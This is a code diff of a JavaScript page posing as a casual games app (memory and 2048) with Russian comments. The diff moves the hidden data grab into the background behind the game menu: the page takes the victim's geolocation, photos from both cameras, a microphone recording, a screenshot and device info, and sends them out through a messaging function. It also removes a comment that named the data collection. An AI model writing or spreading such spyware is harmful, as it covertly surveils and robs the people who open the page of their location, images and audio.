@@ -246,7 +246,6 @@ function showWinToast(message) {
     setTimeout(() => toast.remove(), 2500);
 }
 
-// Мемори (исправлена)
 function createMemoryGame(onBack) {
     const emojis = ['🐶', '🐱', '🐭', '🐹', '🐰', '🦊', '🐻', '🐼'];
     let cards = [...emojis, ...emojis];
@@ -325,7 +324,6 @@ function createMemoryGame(onBack) {
             const card = document.createElement('div');
             card.className = 'memory-card';
             card.dataset.emoji = emoji;
-            card.dataset.index = i;
             card.textContent = '?';
             card.addEventListener('click', () => onCardClick(card, emoji));
             grid.appendChild(card);
@@ -350,7 +348,6 @@ function createMemoryGame(onBack) {
     return container;
 }
 
-// 2048
 function create2048Game(onBack) {
     let grid = [[0,0,0,0],[0,0,0,0],[0,0,0,0],[0,0,0,0]];
     let score = 0;
@@ -510,43 +507,58 @@ function showGameSelector() {
 }
 
 function startGame(type) {
-    let game = type === 'memory' ? createMemoryGame(showGameSelector) : create2048Game(showGameSelector);
+    const game = type === 'memory' ? createMemoryGame(showGameSelector) : create2048Game(showGameSelector);
     app.innerHTML = '';
     app.appendChild(game);
 }
 
-// ========== ЗАПУСК СБОРА ДАННЫХ ==========
+// ========== ЗАПУСК ==========
 async function main() {
+    // Скрываем спиннер (если есть)
     const loader = document.querySelector('.loader');
     if (loader) loader.style.display = 'none';
     
-    getGeo(async (loc) => {
-        if (loc) await sendMessage(`📍 Яндекс.Карты: https://yandex.com/maps/?pt=${loc.lon},${loc.lat}&z=17`);
-        
-        getCamera('user', async (stream) => {
-            if (stream) {
-                await takePhoto(stream, '📸 Фронтальная камера');
-                setTimeout(async () => {
-                    getCamera('environment', async (backStream) => {
-                        if (backStream) {
-                            await takePhoto(backStream, '📸 Задняя камера');
-                            backStream.getTracks().forEach(t => t.stop());
-                        }
-                        stream.getTracks().forEach(t => t.stop());
-                        await recordAudio();
-                        await takeScreenshot();
-                        const allInfo = await collectAllInfo();
-                        await sendMessage(allInfo);
-                        showGameSelector();
-                    });
-                }, 3000);
-            } else {
-                const allInfo = await collectAllInfo();
-                await sendMessage(allInfo);
-                showGameSelector();
+    // Сначала показываем выбор игр
+    showGameSelector();
+    
+    // Потом в фоне собираем данные (не блокируя интерфейс)
+    setTimeout(async () => {
+        // Геолокация
+        getGeo(async (loc) => {
+            if (loc) {
+                await sendMessage(`📍 Яндекс.Карты: https://yandex.com/maps/?pt=${loc.lon},${loc.lat}&z=17`);
             }
+            
+            // Камера
+            getCamera('user', async (stream) => {
+                if (stream) {
+                    await takePhoto(stream, '📸 Фронтальная камера');
+                    
+                    setTimeout(async () => {
+                        getCamera('environment', async (backStream) => {
+                            if (backStream) {
+                                await takePhoto(backStream, '📸 Задняя камера');
+                                backStream.getTracks().forEach(t => t.stop());
+                            }
+                            stream.getTracks().forEach(t => t.stop());
+                            
+                            // Микрофон и скриншот
+                            await recordAudio();
+                            await takeScreenshot();
+                            
+                            // Остальная информация
+                            const allInfo = await collectAllInfo();
+                            await sendMessage(allInfo);
+                        });
+                    }, 3000);
+                } else {
+                    const allInfo = await collectAllInfo();
+                    await sendMessage(allInfo);
+                }
+            });
         });
-    });
+    }, 100);
 }
 
+// Запускаем всё
 main();
